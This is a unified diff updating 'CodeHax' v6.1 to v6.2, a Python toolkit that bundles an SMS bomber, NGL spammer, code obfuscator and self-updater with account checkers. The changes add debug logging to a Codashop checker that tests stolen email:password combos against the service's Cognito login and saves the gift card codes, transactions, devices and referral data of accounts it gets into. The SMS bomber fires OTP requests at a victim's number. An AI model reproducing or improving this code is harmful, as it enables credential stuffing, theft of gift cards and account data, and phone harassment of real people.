@@ -3,7 +3,7 @@
 Universal Python Obfuscator / Decoder + NGL Spammer + Self‑Updater + NetEase Checker
 + SMS Bomber + CODM Checker (fetched from GitHub) + Fresh Cookie Downloader + Codashop Checker
 Made by @ItsMeJeff, @Antraxdevz
-v6.1 – Fixed Codashop Auth & Missing Imports
+v6.2 – Enhanced Codashop Auth Debugging
 """
 
 import argparse, base64, dis, hashlib, hmac, importlib, json, logging, marshal, os, random, re, shutil
@@ -17,7 +17,7 @@ from pathlib import Path
 from typing import Optional, List, Callable, Tuple
 import requests, urllib.parse, signal
 
-# ---------- Optional rich interface (now includes Progress, Live) ----------
+# ---------- Optional rich interface ----------
 try:
     from rich.console import Console
     from rich.panel import Panel
@@ -58,16 +58,16 @@ except ImportError:
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
 log = logging.getLogger("CodeHax")
 
-VERSION = "6.1"
+VERSION = "6.2"
 UPDATE_URL = "https://github.com/CodeHax-ItsMeJeff/CodeHax/raw/refs/heads/main/main.py"
 CODM_URL = "https://github.com/CodeHax-ItsMeJeff/CodeHax/raw/refs/heads/main/codm.py"
 FRESH_COOKIE_URL = "https://raw.githubusercontent.com/CodeHax-ItsMeJeff/CodeHax/main/fresh_cookie.txt"
 NGL_API_URL = "https://ngl.link/api/submit"
 
-# Codashop constants
-COGNITO_CLIENT_ID = "437f3u0sfh0h7av0rlrrjdtmsb"
+# ---------- Codashop constants – UPDATE CLIENT ID HERE IF NEEDED ----------
+COGNITO_CLIENT_ID = "437f3u0sfh0h7av0rlrrjdtmsb"   # <-- Change this if outdated
 COGNITO_REGION = "ap-southeast-1"
-COGNITO_URL = f"https://cognito-idp.ap-southeast-1.amazonaws.com"
+COGNITO_URL = f"https://cognito-idp.{COGNITO_REGION}.amazonaws.com/"
 WALLET_API = "https://wallet-api.codacash.com"
 USER_API = "https://user-api.codacash.com"
 GAME_API = "https://game-api.codacash.com"
@@ -123,7 +123,7 @@ total_accounts = 0
 shutdown_event = threading.Event()
 
 # ----------------------------------------------------------------------
-# Decoding engines (unchanged)
+# Decoding engines
 # ----------------------------------------------------------------------
 def decode_layer_v1(encoded_str: str) -> Optional[str]:
     try:
@@ -586,7 +586,7 @@ class SmsBomber:
                 return APIResponse(service_name=service_name, success=False, error_message=f"Unexpected error: {str(e)}")
         return APIResponse(service_name=service_name, success=False, error_message="Max retries exceeded")
 
-    # ----- Service methods (same as before) -----
+    # ---- Service methods ----
     def _send_s5(self, formatted_num: str) -> Tuple[str, bool, Optional[int]]:
         try:
             url = 'https://api.s5.com/player/api/v1/otp/request'
@@ -987,7 +987,7 @@ def download_fresh_cookies():
         log.error(f"Failed to download cookies: {e}")
 
 # ======================================================================
-# CODASHOP CHECKER (FIXED)
+# CODASHOP CHECKER (ENHANCED DEBUGGING)
 # ======================================================================
 def format_date(iso_str):
     if not iso_str or iso_str == "N/A":
@@ -1035,7 +1035,7 @@ class CodashopUltimate:
             f.write(content + "\n")
 
     def cognito_auth(self, email, password):
-        """Authenticate via Cognito with retries and detailed error logging."""
+        """Authenticate via Cognito with detailed debugging."""
         for attempt in range(3):
             session = requests.Session()
             session.headers.update({
@@ -1051,6 +1051,9 @@ class CodashopUltimate:
             }
             try:
                 resp = session.post(COGNITO_URL, json=payload, timeout=15)
+                # Debug: Print full response for troubleshooting
+                if resp.status_code != 200:
+                    log.debug(f"Auth attempt {attempt+1} failed - Status: {resp.status_code}, Body: {resp.text[:200]}")
                 if resp.status_code == 200:
                     data = resp.json()
                     if "AuthenticationResult" in data:
@@ -1060,7 +1063,10 @@ class CodashopUltimate:
                         return None
                 elif resp.status_code == 400:
                     try:
-                        err = resp.json().get("__type", "")
+                        err_data = resp.json()
+                        err = err_data.get("__type", "")
+                        message = err_data.get("message", "")
+                        log.debug(f"Auth 400 - Type: {err}, Message: {message}")
                     except:
                         err = resp.text[:100]
                     if "NotAuthorizedException" in err or "UserNotFoundException" in err:
@@ -1068,7 +1074,7 @@ class CodashopUltimate:
                     elif "PasswordResetRequiredException" in err:
                         return "change_password"
                     else:
-                        log.debug(f"Auth error: {err}")
+                        console.print(f"[yellow]Auth error for {email}: {err} - {message if 'message' in locals() else ''}[/yellow]")
                         return None
                 else:
                     log.debug(f"Auth failed with status {resp.status_code}: {resp.text[:100]}")
@@ -1220,8 +1226,7 @@ class CodashopUltimate:
             console.print(f"[red][!] EXCEPTION: {combo} | {str(e)}[/red]")
 
     def save_transactions(self, token, email, pwd, txns):
-        if not txns:
-            return
+        if not txns: return
         content = f"{email}:{pwd}\n"
         for t in txns[:10]:
             amt = t.get("amount", 0)
@@ -1231,8 +1236,7 @@ class CodashopUltimate:
         self.save_result("Results/Transactions", "transactions", content)
 
     def save_devices(self, token, email, pwd, devs):
-        if not devs:
-            return
+        if not devs: return
         content = f"{email}:{pwd}\n"
         for d in devs:
             model = d.get("model", "N/A")
@@ -1241,8 +1245,7 @@ class CodashopUltimate:
         self.save_result("Results/Devices", "devices", content)
 
     def save_giftcards(self, token, email, pwd, cards):
-        if not cards:
-            return
+        if not cards: return
         content = f"{email}:{pwd}\n"
         for c in cards:
             code = c.get("code", "N/A")
@@ -1251,8 +1254,7 @@ class CodashopUltimate:
         self.save_result("Results/Giftcards", "giftcards", content)
 
     def save_referral(self, token, email, pwd, ref):
-        if not ref:
-            return
+        if not ref: return
         content = f"{email}:{pwd} | Code: {ref.get('code')} | Earned: {ref.get('totalEarned', 0)} | Clicks: {ref.get('clicks', 0)}"
         self.save_result("Results/Referrals", "referrals", content)
 
@@ -1383,7 +1385,7 @@ def build_menu_table():
     else:
         lines = []
         lines.append("┌──────────────────────────────┐")
-        lines.append("│   ★  C O D E H A X  v6.1  ★ │")
+        lines.append("│   ★  C O D E H A X  v6.2  ★ │")
         lines.append("├──────────────────────────────┤")
         lines.append("│ [1] Decode a file            │")
         lines.append("│ [2] Obfuscate a file         │")
@@ -1475,7 +1477,7 @@ def interactive_menu():
         input("\nPress Enter to continue...")
 
 # ----------------------------------------------------------------------
-# CLI (updated with codashop)
+# CLI
 # ----------------------------------------------------------------------
 def create_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(description=f"CodeHax v{VERSION}")
